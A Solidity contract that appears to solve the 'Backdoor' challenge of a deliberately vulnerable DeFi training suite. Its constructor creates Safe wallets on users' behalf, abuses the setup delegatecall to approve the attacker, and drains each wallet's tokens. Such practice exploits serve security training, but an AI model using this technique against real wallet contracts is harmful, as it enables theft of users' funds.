// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {
    SafeProxyFactory,
    SafeProxy,
    IProxyCreationCallback
} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {console} from "forge-std/console.sol";

contract DelegateContract {
    function approve(DamnValuableToken token, address receiver) external {
        token.approve(receiver, 10e18);
    }
}

contract AttackBackdoor {
    constructor(
        address[] memory users,
        Safe singleton,
        SafeProxyFactory walletFactory,
        DamnValuableToken token,
        IProxyCreationCallback walletRegistry,
        address recovery
    ) {
        DelegateContract delegateContract = new DelegateContract();
        address[] memory owner = new address[](1);

        for (uint256 i = 0; i < users.length; i++) {
            owner[0] = users[i];
            bytes memory data = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owner,
                1,
                address(delegateContract),
                abi.encodeWithSignature("approve(address,address)", address(token), address(this)),
                address(0),
                address(0),
                0,
                address(0)
            );
            SafeProxy proxy = walletFactory.createProxyWithCallback(address(singleton), data, 0, walletRegistry);

            token.transferFrom(address(proxy), recovery, 10e18);
        }
    }
}
